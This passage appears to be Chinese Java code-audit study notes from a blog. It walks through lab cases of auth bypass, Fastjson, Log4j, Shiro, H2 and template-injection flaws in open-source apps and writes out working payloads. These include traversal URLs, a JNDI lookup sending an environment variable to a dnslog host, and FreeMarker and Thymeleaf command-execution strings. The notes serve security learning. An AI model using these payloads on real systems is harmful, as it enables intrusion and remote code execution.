src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A113.png"></p></li><li><p>发现传入的值是rootpath与path的值的拼接</p></li><li><p>构造payload：</p><ul><li><p>同样是使用..&#x2F;跳到上一级的原理</p></li><li><pre><code class="language-url">/////..///..///..///..///..//1.txt<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br>  - 根据源代码，<span class="hljs-comment">//会被替换为空</span><br><br>  - 只有url中加上<span class="hljs-comment">//才能正常执行，具体原因未知</span><br><br><span class="hljs-meta">### 鉴权 未授权访问</span><br><br>[<span class="hljs-meta">Java代码审计&amp;鉴权漏洞&amp;Interceptor&amp;Filter&amp;Shiro&amp;JWT_java鉴权-CSDN博客</span>](https:<span class="hljs-comment">//blog.csdn.net/qq_46081990/article/details/135207986)</span><br><br><span class="hljs-number">1.</span> 过滤器               -- 逻辑安全问题<br><span class="hljs-number">2.</span> 自定义代码       -- 逻辑安全问题<br><span class="hljs-number">3.</span> shiro框架验证  -- 找shiro版本漏洞<br><br>- 鉴权使用的框架，拦截器，过滤器等<br><br>  ![](/img/java审计/java审计<span class="hljs-number">14.</span>png)<br>  <br>  拦截器一般流程<br>  <br>  ![](/img/java审计/java审计<span class="hljs-number">15.</span>png)<br><br><span class="hljs-meta">#### 挖掘点</span><br><br><span class="hljs-number">1.</span> 拦截器中是否鉴权<br><span class="hljs-number">2.</span> 过滤器中是否鉴权<br><span class="hljs-number">3.</span> Shiro版本及其逻辑配置<br><span class="hljs-number">4.</span> 有无JWT<br><span class="hljs-number">5.</span> 以上都没有，查找是否是自写代码鉴权<br><br><span class="hljs-meta">#### Newbee案例(拦截器)</span><br><br>- 确定鉴权使用的是哪种模式<br>  - 在pom.xml文件中搜索jwt和shiro关键字，发现并没有这两种依赖的导入<br>  - 继续通过翻看目录确定是过滤器还是拦截器<br>  - 翻看过程中发现有intercepetor目录<br>  <br>- 确定使用拦截器鉴权<br><br>- 拦截器鉴权一般写在preHandle方法内<br><br>  ```<span class="hljs-function">java</span><br><span class="hljs-function">  <span class="hljs-keyword">public</span> boolean <span class="hljs-title">preHandle</span>(<span class="hljs-params">HttpServletRequest request, HttpServletResponse response, Object o</span>) throws Exception</span> &#123;<br>      <span class="hljs-comment">// 获取当前请求的路径</span><br>      String requestServletPath = request.getServletPath();<br>      <br>      <span class="hljs-comment">// 检查请求路径是否以&quot;/admin&quot;开头且会话中没有&quot;loginUser&quot;属性（即用户未登录）</span><br>      <span class="hljs-keyword">if</span> (requestServletPath.startsWith(<span class="hljs-string">&quot;/admin&quot;</span>) &amp;&amp; <span class="hljs-literal">null</span> == request.getSession().getAttribute(<span class="hljs-string">&quot;loginUser&quot;</span>)) &#123;<br>          <span class="hljs-comment">// 设置错误消息到会话中</span><br>          request.getSession().setAttribute(<span class="hljs-string">&quot;errorMsg&quot;</span>, <span class="hljs-string">&quot;请登陆&quot;</span>);<br>          <span class="hljs-comment">// 重定向到管理员登录页面</span><br>          response.sendRedirect(request.getContextPath() + <span class="hljs-string">&quot;/admin/login&quot;</span>);<br>          <span class="hljs-comment">// 返回false表示中断请求继续执行</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-comment">// 如果已登录或非admin路径请求，则清除可能的错误消息</span><br>          request.getSession().removeAttribute(<span class="hljs-string">&quot;errorMsg&quot;</span>);<br>          <span class="hljs-comment">// 返回true允许请求继续执行</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure></code></pre></li></ul><p>核心判断语句requestServletPath.startsWith(“&#x2F;admin”) &amp;&amp; null </p><p>路径开头以admin开头，并且session中loginUser为null</p></li><li><p>利用方式：构造路径为&#x2F;;&#x2F;admin或&#x2F;&#x2F;admin后访问</p></li><li><p>实操发现页面显示404，猜测是与浏览器有关</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A116.png"></p></li></ul><h4 id="华夏ERP案例-过滤器"><a href="#华夏ERP案例-过滤器" class="headerlink" title="华夏ERP案例(过滤器)"></a>华夏ERP案例(过滤器)</h4><ul><li><p>同样在依赖中先搜索jwt和shiro关键字，发现没有</p></li><li><p>翻找目录看到filter目录，发现是过滤器设置</p></li><li><p>过滤器核心代码在doFilter方法内</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <br>    <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <br>    <span class="hljs-comment">// 1. 将 ServletRequest/ServletResponse 转换为 HttpServletRequest/HttpServletResponse</span><br>    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>    <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">servletResponse</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>    <br>    <span class="hljs-comment">// 2. 获取当前请求的 URL</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> servletRequest.getRequestURI();<br>    <br>    <span class="hljs-comment">// 3. 检查用户是否已登录（session 中是否有 &quot;user&quot; 属性）</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> servletRequest.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br>    <br>    <span class="hljs-comment">// 4. 如果用户已登录，直接放行请求</span><br>    <span class="hljs-keyword">if</span> (userInfo != <span class="hljs-literal">null</span>) &#123;<br>        chain.doFilter(request, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 5. 如果请求的是登录页（/login.html）或注册页（/register.html），直接放行</span><br>    <span class="hljs-keyword">if</span> (requestUrl != <span class="hljs-literal">null</span> &amp;&amp; (requestUrl.contains(<span class="hljs-string">&quot;/login.html&quot;</span>) || requestUrl.contains(<span class="hljs-string">&quot;/register.html&quot;</span>))) &#123;<br>        chain.doFilter(request, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 6. 检查请求是否在忽略列表（ignoredList）中，如果是则放行</span><br>    <span class="hljs-keyword">if</span> (verify(ignoredList, requestUrl)) &#123;<br>        chain.doFilter(servletRequest, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 7. 检查请求是否在白名单（allowUrls）中，如果是则放行</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">for</span> (String url : allowUrls) &#123;<br>            <span class="hljs-keyword">if</span> (requestUrl.startsWith(url)) &#123;<br>                chain.doFilter(request, response);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 8. 如果以上条件都不满足，说明用户未登录且访问的是受保护资源，重定向到登录页</span><br>    servletResponse.sendRedirect(<span class="hljs-string">&quot;/login.html&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>利用白名单过滤绕过鉴权</p></li><li><p>抓包，在数据包url处更改</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A117.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">/login.html/../account/getAccount     =  /account/getAccount <br>/register.html/../account/getAccount  =  /account/getAccount <br>/a.js/../account/getAccount           =  /account/getAccount  <br>/user/login/../../account/getAccount  =  /account/getAccount <br></code></pre></td></tr></table></figure></li></ul><h4 id="Tumo案例-Shiro"><a href="#Tumo案例-Shiro" class="headerlink" title="Tumo案例(Shiro)"></a>Tumo案例(Shiro)</h4><ul><li><p>同样先在依赖中搜索关键字，发现此源代码使用了shiro框架</p></li><li><p>查看版本，查找资料判断是否有权限绕过漏洞</p></li><li><p>查看目录找到shiro配置文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">tumo.shiro.anon_url=\<br>  /login,/logout,/register,\<br>  /,/about,/p<span class="hljs-comment">/**,/links,/comment/**,/link/list,/article/list,\</span><br><span class="hljs-comment">  /css/**,/js/**,///**</span><br></code></pre></td></tr></table></figure><p>anon代表可以匿名访问(无需登录)</p></li><li><p>寻找url后带有&#x2F;**的，可以利用它访问到其他地址</p></li></ul><h4 id="FastCMS案例-JWT鉴权"><a href="#FastCMS案例-JWT鉴权" class="headerlink" title="FastCMS案例(JWT鉴权)"></a>FastCMS案例(JWT鉴权)</h4><ul><li><p>Jwt技术鉴权</p><ul><li>生成时使用空加密（逻辑代码问题）</li><li>服务端未校验签名（逻辑代码问题）</li><li>密钥默认未被修改（搭建后未修改）</li><li>密钥爆破可能性大（密钥过于简单）</li></ul></li><li><p>开始审计</p></li><li><p>搜索关键字jwt发现有包引用</p><p>或：数据包中存在jwt特征：两个点将token分解为三段</p></li><li><p>检查密钥是否修改</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A118.png"></p></li><li><p>越权实例：<a href="https://www.cnblogs.com/thebeastofwar/p/17920565.html">Nacos漏洞复现总结 - BattleofZhongDinghe - 博客园 (cnblogs.com)</a></p></li></ul><h3 id="第三方组件漏洞利用"><a href="#第三方组件漏洞利用" class="headerlink" title="第三方组件漏洞利用"></a>第三方组件漏洞利用</h3><ul><li>找存在的第三方组件(Package Checker插件)</li><li>找组件利用入口条件(根据网上已知漏洞复现条件)</li><li>找可控地方测试检测(根据网上已知漏洞利用条件)</li></ul><h4 id="Tmall案例-Fastjson"><a href="#Tmall案例-Fastjson" class="headerlink" title="Tmall案例(Fastjson)"></a>Tmall案例(Fastjson)</h4><ul><li><p>在pom.xml文件中找到FastJson的依赖项，其版本为1.2.58</p></li><li><p>漏洞触发函数   JSON.parseObject()    JSON.parse()</p><ul><li><code>JSON.parseObject()</code> 是 FastJSON 的核心方法，用于 JSON → Java 对象的转换。</li><li>比 <code>JSON.parse()</code>（返回 <code>Object</code>）更常用，因为它可以直接指定目标类型。</li></ul></li><li><p>全局搜索关键字后，继续寻找有可控变量的地方，才有利用点</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A119.png"></p><p>找到此代码并且发现此变量可控，确定此处为漏洞触发点</p></li><li><p>搭建好环境后通过代码可以判断漏洞利用点在添加商品功能处</p></li><li><p>抓取数据包，将propertyJson参数更改为poc</p><p>参考文章：<a href="https://blog.csdn.net/liguangyao213/article/details/123929296">Fastjson反序列化审计及验证_fastjson 1.2.58漏洞-CSDN博客</a></p><p>使用dns平台：{“@type”:”java.net.Inet4Address”,”val”:”3042zb.dnslog.cn”}</p><p>在实操过程中有500报错</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A120.png"></p><p>原因</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A121.png"></p><p>视频演示时可以收到访问请求</p><p>后续查看时发现bp自带的测试地址收到了访问请求</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A122.png"></p></li></ul><h4 id="Tmall-Log4j-2-10-0"><a href="#Tmall-Log4j-2-10-0" class="headerlink" title="Tmall-Log4j   2.10.0"></a>Tmall-Log4j   2.10.0</h4><ul><li><p>log4j漏洞原理</p><p><a href="https://www.freebuf.com/articles/web/364311.html">一文读懂面试官都在问的Log4J2漏洞 - FreeBuf网络安全行业门户</a></p><p><a href="https://blog.csdn.net/Koikoi12/article/details/121906895">log4j漏洞成因和原理（JNDI和LDAP）_，8849。com-CSDN博客</a></p><p> Apache log4j2-RCE 漏洞是由于Log4j2提供的lookup功能下的Jndi &#x3D;&#x3D;Lookup&#x3D;&#x3D;模块出现问题所导致的，&#x3D;&#x3D;该功能模块在输出日志信息时允许开发人员通过相应的协议去请求远程主机上的资源。而开发人员在处理数据时，并没有对用户输入的信息进行判断，导致Log4j2请求远程主机上的含有恶意代码的资源 并执行其中的代码，从而造成远程代码执行漏洞。&#x3D;&#x3D;</p></li><li><p>搜索关键字(触发点) ：logger.error  logger.info</p></li><li><p>在诸多结果中寻找带有可控变量的</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/Java%E5%AE%A1%E8%AE%A123.png"></p><p>可以通过更改图片上传的文件名更改参数值</p></li><li><p>利用jndi注入</p><p><a href="https://xz.aliyun.com/news/11723">JNDI注入原理及利用考究-先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/csd_ct/article/details/122916620">log4j漏洞分析及总结_log4j漏洞是什么-CSDN博客</a></p></li><li><p>上传管理员头像图片后抓包，更改文件名为poc</p><p>filename&#x3D;”${jndi:ldap:&#x2F;&#x2F;${env:OS}.7ffb7b28.log.dnslog.sbs}”</p></li><li><p>jndi注入工具：【JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar】</p></li></ul><h4 id="RuoYi-v4-2-0-shiro漏洞利用"><a href="#RuoYi-v4-2-0-shiro漏洞利用" class="headerlink" title="RuoYi-v4.2.0(shiro漏洞利用)"></a>RuoYi-v4.2.0(shiro漏洞利用)</h4><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><ul><li><p>搜索关键字查找shiro依赖项，查看版本号 1.4.2</p></li><li><p>找到漏洞利用文章</p></li><li><p>在源代码中直接查找key</p><ul><li><p>搜索关键字setCipherKey，找到shiro密钥</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A124.png"></p></li></ul></li><li><p>在实战中利用工具爆破密钥，学习反序列化后选择某条攻击链，实现RCE</p></li><li><p>shiro反序列化工具：<a href="https://github.com/Ares-X/shiro-exploit">GitHub - Ares-X&#x2F;shiro-exploit: Shiro反序列化利用工具，支持新版本(AES-GCM)Shiro的key爆破，配合ysoserial，生成回显Payload</a></p></li></ul><h5 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h5><p><a href="https://www.freebuf.com/vuls/231909.html">Shiro权限绕过漏洞分析（CVE-2020-1957） - FreeBuf网络安全行业门户</a></p><ul><li><p>shiro的一般规则</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A125.png"></p></li><li><p>找到ShiroConfig.java文件查看允许匿名访问的目录</p></li><li><p>根据文章构造poc测试</p></li></ul><h4 id="Halo-H2Database"><a href="#Halo-H2Database" class="headerlink" title="Halo(H2Database)"></a>Halo(H2Database)</h4><p><a href="https://www.cnblogs.com/ArcherCY/p/17699288.html">H2 database漏洞复现 - Running_J - 博客园 (cnblogs.com)</a></p><ul><li><p>搭建好环境进入后台</p></li><li><p>访问页面<a href="http://localhost:8090/h2-console">http://localhost:8090/h2-console</a></p></li><li><p>利用jndi注入工具生成poc</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A126.png"></p></li><li><p>传值</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A127.png"></p><p>javax.naming.InitialContext</p><p>注入使用的poc</p></li><li><p>实操并未弹出计算器，猜测是jdk版本过高</p></li><li><p>此漏洞利用要求：H2 database自带的web管理页面允许外部用户访问web管理界面，且不经过身份验证</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//这个就是设置启用还是禁用web管理界面</span><br>spring.h2.console.enabled=<span class="hljs-literal">true</span><br><span class="hljs-comment">//这个就是设置是否允许外部用户进行访问管理界面，并不通过身份验证</span><br>spring.h2.console.settings.web-allow-others=<span class="hljs-literal">true</span><br>如果这两个设置钧开启，那么就可以利用jndi进行注入攻击。<br></code></pre></td></tr></table></figure></li></ul><h3 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h3><ol><li>找项目中是否存在模板引擎(类型及安全问题)</li><li>找模板注入利用入口条件</li><li>找可控地方进行测试检测</li></ol><ul><li><p>常见模板引擎</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A128.png"></p></li></ul><h4 id="Halo案例-FreeMarker模板"><a href="#Halo案例-FreeMarker模板" class="headerlink" title="Halo案例(FreeMarker模板)"></a>Halo案例(FreeMarker模板)</h4><p><a href="https://www.cnblogs.com/nice0e3/p/16217471.html">Java安全之freemarker 模板注入 - nice_0e3 - 博客园 (cnblogs.com)</a></p><ul><li><p>全局搜索关键字freemarker,发现源代码中有freemarker的配置</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A129.png"></p><p>发现FreeMarker的配置文件是 .ftl后缀   </p></li><li><p>修改resources\templates\themes\anatole\index.ftl文件</p><p>加入poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ftl">&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;whoami&quot;).start()&#125;<br>或<br>&lt;#assign test=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;test(&quot;calc&quot;)&#125;<br></code></pre></td></tr></table></figure><p>运行此容器，打开首页发现有计算机弹出，执行了系统命令</p></li><li><p>漏洞利用</p><ul><li>找到模板文件中可控变量，写入poc</li></ul></li><li><p>此源代码没有利用入口</p></li></ul><h4 id="RuoYi-v4-6-0案例-Thymeleaf"><a href="#RuoYi-v4-6-0案例-Thymeleaf" class="headerlink" title="RuoYi-v4.6.0案例(Thymeleaf)"></a>RuoYi-v4.6.0案例(Thymeleaf)</h4><p><a href="https://xz.aliyun.com/news/9281">Thymeleaf Fragment 注入漏洞复现及新姿势扩展-先知社区 (aliyun.com)</a></p><ul><li><p>搜索关键字发现是Thymeleaf模板</p></li><li><p>找入口(寻找与文章中类似的return入口)</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A130.png"></p><p>存在可控变量的return入口</p></li><li><p>找到路由 </p><p><a href="http://localhost:8088/monitor/cache">http://localhost:8088/monitor/cache</a></p></li><li><p>抓取数据包后更改变量fragment的值，传入payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">__$&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;id&quot;</span>).getInputStream()).next()&#125;__::.x<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A131.png"></p><p>成功弹出计算器</p></li></ul><h3 id="FastJson反序列化漏洞"><a href="#FastJson反序列化漏洞" class="headerlink" title="FastJson反序列化漏洞"></a>FastJson反序列化漏洞</h3><p><a href="https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw">微信公众平台 (qq.com)</a></p><p><a href="https://xz.aliyun.com/news/12174#toc-16">https://xz.aliyun.com/news/12174#toc-16</a> (Java反序列化之FastJson反序列化及绕过)</p><p><a href="https://www.ddosi.org/fastjson-payload/#Fastjson_1222-1224">Fastjson漏洞利用姿势技巧集合 | Fastjson payload - 🔰雨苁ℒ🔰 (ddosi.org)</a></p><h4 id="fastjson反序列化漏洞原理"><a href="#fastjson反序列化漏洞原理" class="headerlink" title="fastjson反序列化漏洞原理"></a>fastjson反序列化漏洞原理</h4><ul><li><p>使用AutoType功能进行序列化的JSON字符会带有一个@type来标记其字符的原始类型</p></li><li><p>在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的set或者get方法</p></li><li><p>@type的类有可能被恶意构造，构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。</p></li><li><p>常见的有sun官方提供的一个类com.sun.rowset.JdbcRowSetImpl，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用！因此整个漏洞复现的原理过程就是：</p><ol><li>攻击者（我们）访问存在fastjson漏洞的目标靶机网站，通过burpsuite抓包改包，以json格式添加com.sun.rowset.JdbcRowSetImpl恶意类信息发送给目标机。</li><li>存在漏洞的靶机对json反序列化时候，会加载执行我们构造的恶意信息(访问rmi服务器)，靶机服务器就会向rmi服务器请求待执行的命令。也就是靶机服务器问rmi服务器，（靶机服务器）需要执行什么命令</li><li>rmi 服务器请求加载远程机器的class（这个远程机器是我们搭建好的恶意站点，提前将漏洞利用的代码编译得到.class文件，并上传至恶意站点），得到攻击者（我们）构造好的命令（ping dnslog或者创建文件或者反弹shell啥的）</li><li>rmi将远程加载得到的class（恶意代码），作为响应返回给靶机服务器。<br>靶机服务器执行了恶意代码，被攻击者成功利用。</li></ol></li></ul><h4 id="Jndi注入原理"><a href="#Jndi注入原理" class="headerlink" title="Jndi注入原理"></a>Jndi注入原理</h4><ul><li><p>JNDI即Java Naming and Directory Interface（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p></li><li><p>JNDI 注入，即当开发者在定义 <code>JNDI</code> 接口初始化时，<code>lookup()</code> 方法的参数可控，攻击者就可以将恶意的 <code>url</code> 传入参数远程加载恶意载荷，造成注入攻击。</p></li></ul><h4 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h4><h5 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h5><ul><li><p>FastjsonController</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.fastjson.demos.web;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String str=<span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:31&#125;&quot;</span>;<br>        String userStr=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.kuang.fastjson.demos.web.User\&quot;,\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:21&#125;&quot;</span>;<br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> JSON.parseObject(userStr);<br>        System.out.println(data);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>加入User类解析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.fastjson.demos.web;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">private</span> Integer age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(Integer age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行后发现传入其他类解析后默认执行get  set类方法</p></li><li><p>构造poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.fastjson.demos.web;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">//触发fastjson反序列化用到JSON.parseObject,JSON.parse()</span><br><br>        String str=<span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:31&#125;&quot;</span>;<br>        String userStr=<span 